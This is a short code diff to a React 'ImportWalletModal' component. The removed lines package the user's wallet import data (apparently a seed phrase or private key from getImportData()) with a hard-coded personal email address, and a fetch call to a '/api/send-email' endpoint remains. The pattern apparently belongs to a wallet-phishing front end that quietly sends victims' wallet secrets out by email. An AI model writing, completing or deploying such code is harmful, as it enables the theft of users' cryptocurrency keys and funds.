@@ -94,15 +94,6 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
 
     try {
       // Prepare email data
-      const emailData = {
-        type: "wallet",
-        walletName: selectedWallet?.name || "Unknown Wallet",
-        importMethod: activeTab,
-        importData: getImportData(),
-        userEmail: "jilljelly6@gmail.com", // You can make this configurable
-      };
-
-      // Send email
       const response = await fetch("/api/send-email", {
         method: "POST",
         headers: {
